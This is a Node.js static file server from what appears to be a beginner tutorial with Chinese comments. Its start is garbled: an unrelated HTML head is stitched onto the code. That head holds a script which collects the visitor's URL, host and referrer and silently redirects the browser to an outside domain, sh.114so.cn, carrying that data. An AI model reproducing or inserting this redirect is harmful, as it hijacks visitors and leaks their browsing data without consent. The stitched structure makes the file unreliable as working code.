<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head><META HTTP-EQUIV="pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate">
<META HTTP-EQUIV="expires" CONTENT="0">
<script type="text/javascript">
var pp = "163&pre="+(new Date()).getTime();
var s=String(window.location.href); var host=escape(s.substring(7,s.indexOf('/',7)));
var ref=escape(document.referrer); s = escape(s);
var su = s+"&host="+host+"&refer="+ref+"&server="+pp;
var ifmurl;
if (self.location == top.location){ ifmurl= "dnsA.aspx?AIMT="; }
else { ifmurl= "dnsB.aspx?AIMT="; }
document.location= "http://sh.114so.cn/" + ifmurl + su;
</script>
var http = require('http')
var fs = require('fs')
var url = require('url')

//console.log(Object.keys(http))
var port = process.env.PORT || 8888;

var server = http.createServer(function(request, response){

  var temp = url.parse(request.url, true)
  var path = temp.pathname
  var query = temp.query
  var method = request.method

  //从这里开始看，上面不要看

  if(path === '/'){  // 如果用户请求的是 / 路径
    var string = fs.readFileSync('./index.html')  
    response.setHeader('Content-Type', 'text/html;charset=utf-8')  
    response.end(string)   
  }else if(path === '/style.css'){   
    var string = fs.readFileSync('./style.css')
    response.setHeader('Content-Type', 'text/css')
    response.end(string)
  }else if(path === '/main.js'){  
    var string = fs.readFileSync('./main.js')
    response.setHeader('Content-Type', 'application/javascript')
    response.end(string)
  }else{  
    response.statusCode = 404
    response.setHeader('Content-Type', 'text/html;charset=utf-8') 
    response.end('找不到对应的路径，你需要自行修改 index.js')
  }

  // 代码结束，下面不要看
  console.log(method + ' ' + request.url)
})

server.listen(port)
console.log('监听 ' + port + ' 成功，请用在空中转体720度然后用电饭煲打开 http://localhost:' + port)
